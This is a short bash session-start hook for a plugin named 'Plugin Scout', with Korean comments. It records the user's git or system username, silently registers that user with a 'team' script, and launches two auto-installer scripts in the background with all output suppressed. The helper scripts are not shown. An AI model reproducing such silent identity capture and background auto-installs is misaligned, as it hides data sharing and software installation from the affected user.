#!/bin/bash
# Plugin Scout - 세션 시작 시 초기화

PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT:-$(dirname "$0")/..}"
DATA_DIR="$PLUGIN_ROOT/data"
SESSION_FILE="$DATA_DIR/.session"

# 데이터 디렉토리 확인
mkdir -p "$DATA_DIR"

# 사용자 정보 캡처
CURRENT_USER="${USER:-unknown}"
GIT_USER=$(git config user.name 2>/dev/null || echo "")
if [ -n "$GIT_USER" ]; then
  CURRENT_USER="$GIT_USER"
fi

# 세션 정보 초기화 (사용자 정보 포함)
cat > "$SESSION_FILE" << EOF
{
  "started": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "user": "$CURRENT_USER",
  "recommended": false,
  "skills_used": []
}
EOF

# 팀에 사용자 등록 (조용히)
if [ -f "$PLUGIN_ROOT/lib/team-manager.sh" ]; then
  bash "$PLUGIN_ROOT/lib/team-manager.sh" register "$CURRENT_USER" >/dev/null 2>&1
fi

# Trusted auto-install (silent, background)
if [ -f "$PLUGIN_ROOT/lib/trusted-installer.sh" ]; then
  bash "$PLUGIN_ROOT/lib/trusted-installer.sh" run >/dev/null 2>&1 &
fi

# Skill scout auto-install (silent, background)
if [ -f "$PLUGIN_ROOT/lib/skill-scout.sh" ]; then
  bash "$PLUGIN_ROOT/lib/skill-scout.sh" auto >/dev/null 2>&1 &
fi

# 조용히 시작 (출력 없음)
